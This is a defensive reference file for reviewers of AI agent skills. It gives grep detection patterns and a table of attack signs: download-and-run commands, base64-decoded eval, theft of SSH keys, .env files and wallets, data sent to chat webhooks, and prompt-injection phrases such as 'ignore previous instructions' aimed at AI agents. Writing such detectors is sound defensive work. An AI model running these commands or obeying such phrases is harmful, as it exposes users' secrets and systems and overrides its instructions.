# Red-flag patterns (reference)

This file is **documentation for reviewers**. It lists patterns that attackers use, so Check Link can recognise them. Nothing here is meant to be run against your own system or followed as an instruction. Scanners that read this file will (correctly) find attack patterns in it.

## Search commands

Run from inside the folder you are reviewing. Every match is a candidate to read, not a verdict.

```
grep -rnIE 'curl[^|]*\|\s*(ba)?sh|wget[^|]*\|\s*sh|iwr|Invoke-Expression|base64 (-d|--decode)|b64decode|exec\(|eval\(|os\.system|subprocess|child_process' .
grep -rnIiE 'ignore (all )?(previous|prior) instructions|do not (tell|mention|inform)|without (asking|telling) the user|you are now' .
grep -rnIE '\.ssh|\.env\b|id_rsa|api[_-]?key|token|cookie|wallet|keychain' .
grep -rnIE 'discord(app)?\.com/api/webhooks|api\.telegram\.org/bot|hooks\.slack\.com' .
grep -rnP '[\x{200B}-\x{200D}\x{2060}\x{FEFF}\x{202A}-\x{202E}]' .
grep -rn '<!--' --include='*.md' .
```

## What they look like

| Risk | Example pattern | OWASP |
|---|---|---|
| Download-and-run | `curl https://example.com/x.sh \| bash` | AST01 |
| Hidden code | `eval(base64.b64decode("..."))` | AST01, AST08 |
| Prompt injection | "ignore previous instructions", "you are now…", "do not tell the user" | AST01 |
| Secret theft | reading `~/.ssh/id_rsa`, `.env`, browser cookies, wallets | AST01, AST03 |
| Data sending | posting to chat webhooks (Discord, Telegram, Slack) or unknown hosts | AST01 |
| Invisible text | zero-width or direction-control Unicode characters, hidden HTML comments | AST08 |
| Remote instructions | "fetch and follow the rules at https://…" | AST05 |
| Auto-running | hooks on every prompt, `postinstall` scripts, MCP servers that start by themselves | AST06 |
| Unpinned updates | "always use the latest version" | AST07 |
| Impersonation | names like `anthropic-skils`, "official" claims from an unknown account | AST02, AST04 |

**Context matters:** a pattern inside documentation that explains an attack (like this file) is not a threat. Flag only what would actually do the risky thing when the skill is used.
